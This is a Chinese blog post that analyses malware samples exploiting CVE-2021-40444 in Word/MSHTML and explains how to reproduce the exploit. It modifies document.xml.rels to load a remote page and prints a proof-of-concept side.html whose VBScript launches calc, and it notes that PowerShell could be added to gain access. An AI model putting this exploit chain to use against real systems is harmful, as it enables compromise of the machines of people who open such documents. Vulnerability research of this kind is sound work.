> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/KOsb2SksOq_qy0pG3PeYRA)

0x01 前言
-------

最近这个 CVE-2021-40444 挺多人想复现的，于是今天就抽空的来看了一下。

**样本:**

`https://bazaar.abuse.ch/sample/938545f7bbe40738908a95da8cdeabb2a11ce2ca36b0f6a74deda9378d380a52/`

`https://bazaar.abuse.ch/sample/d0fd7acc38b3105facd6995344242f28e45f5384c0fdf2ec93ea24bfbc1dc9e6`

`https://bazaar.abuse.ch/sample/1fb13a158aff3d258b8f62fe211fabeed03f0763b2acadbccad9e8e39969ea00`

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfjicZYuSy9ZAp5yXRPpFibJubRlYQsm5XqANbPfyEAAndWxicfMD17pxXSzDyMsNX4TEY4aXJjDjEI6Q/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfjicZYuSy9ZAp5yXRPpFibJubSa1fTU5OvcuYicaZIhFzZ6DERiaHf4Vlq2I2JAVLz8ianib9q0eNyLKjWQ/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfjicZYuSy9ZAp5yXRPpFibJubJjic1t1kd201F0NBpNfgibiaUfGFphnakicqaO1YdH5cRuA9RFd9Nb6D2Q/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfjicZYuSy9ZAp5yXRPpFibJubcicXpyiabj2mDzd6YPc72jdB98ibOsHwrQQj9rcKI9r3n1hZQvpgVxsuQ/640?wx_fmt=png)

0x02 分析
-------

在测试环境中打开文档

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfjicZYuSy9ZAp5yXRPpFibJubdb3BpG1vqB8pOtjNbJBTExwwXxsiaZrw8D3tr7x14yEoVtMqHD2a8qA/640?wx_fmt=png)是的，它在远程加载！

我们先开启开发工具

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfjicZYuSy9ZAp5yXRPpFibJubnEibGliahwiaQNTicGTfPkCmkcBBK9JFwFr0NOHP3REeXYABb0zCibaUnsg/640?wx_fmt=png)

然后解压我们下载的`.docx`, 使用`7-Zip`来提取文件

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfjicZYuSy9ZAp5yXRPpFibJublOxibElY46I8mG1u1XGPSnQR7bGQe2ReCQMQPKET2HhmkxRfAq7YCFQ/640?wx_fmt=png)`\word\_rels\document.xml.rels`找到这个文件然后打开它

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfjicZYuSy9ZAp5yXRPpFibJubnpibTvMoB2Rd7picYwXXWiatJ1bHZBmhz6kRG09iaFibkCPFQmuIdS27pJA/640?wx_fmt=png)发现时通过`MSHTML`来进行远程代码执行

查看它的`html`文件，该文件包含混淆的 `JavaScript`![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfjicZYuSy9ZAp5yXRPpFibJubdhJJo0LtnvmyB0EQPakg8MELW51NJZFTt1oibsHRiann1tfITqIXtNuw/640?wx_fmt=png)

提取一下下载的`.cab`文件，发现里面从提取出名字为`Championship.inf`的文件，并使用目录遍历攻击来运行该文件

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfjicZYuSy9ZAp5yXRPpFibJuby4NoWkYRDKQmQumHEquoLI8fkqXDWg4eeSLelOJMlCuic2uOytD9bqw/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfjicZYuSy9ZAp5yXRPpFibJubV2cZBTkrE0vCG2eErq4e5yOicc8y2RlaibwTz3kG3Sj2d1QIJthnRvQg/640?wx_fmt=png)

梳理一下，它是通过打开文档来远程加载文件地址，然后在本地执行`cab文件`并且在内存中加载`Championship.inf`

这么看来其实利用很简单！

0x03 复现
-------

我们自己本地配置一下环境 修改`\word\_rels\document.xml.rels`把原先地址修改成我们的![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfjicZYuSy9ZAp5yXRPpFibJubj3gbUYn0fVx5XtNZnAxZC9gaicjPDMQvudodpRmE4SRPYNicibErucbSQ/640?wx_fmt=png)

参考文档:

`https://www.freebuf.com/articles/network/243747.html`

**side.html:**

```
<html><head><meta http-equiv="Content-Language" content="en-us"><meta http-equiv="Content-Type" content="text/html; charset=windows-1252"><title>Outlook</title><script id=clientEventHandlersVBS language=vbscript><!-- Sub window_onload()     Set cmd = CreateObject("Wscript.Shell")     cmd.Run("calc") End Sub--></script></head><body><h1>CVE-2021-40444</h1> <object classid="clsid:edbc374c-5730-432a-b5b8-de94f0b57217" id="ViewCtl1" data="" width="100%" height="100%"></object></body></html>
```

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfjicZYuSy9ZAp5yXRPpFibJubjGkVDZVY5moEIDiajskt1RKTaEibBmQ4Jjdl7ZmicIYiaNGFn8WJcPKwDw/640?wx_fmt=png)

0x04 结尾
-------

稍微的结合一下`Powershell`即可打开获取权限![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfjicZYuSy9ZAp5yXRPpFibJubv2icibK9o7erbhZ0Yznah0bx39l5EWksxMkQCibGbZicolOxxGWsAGIibrw/640?wx_fmt=png)

**题外话 (知识星球):** 分享 Red Team 技巧｜资源｜工具 等等 我的学习笔记也会发在这里，顺便督促自己不断学习 && 偶尔比较佛，或者有事会断更。但是校长一定会一直更新下去的！包括但不限于红队内容。![](https://mmbiz.qpic.cn/mmbiz_jpg/icefLCXrhxfjicZYuSy9ZAp5yXRPpFibJub7EyADkKJ0WSCl5XhDeTaZibrV3rIheDQ3icR5icVoGpzyDFMo9lCiaoH2g/640?wx_fmt=jpeg)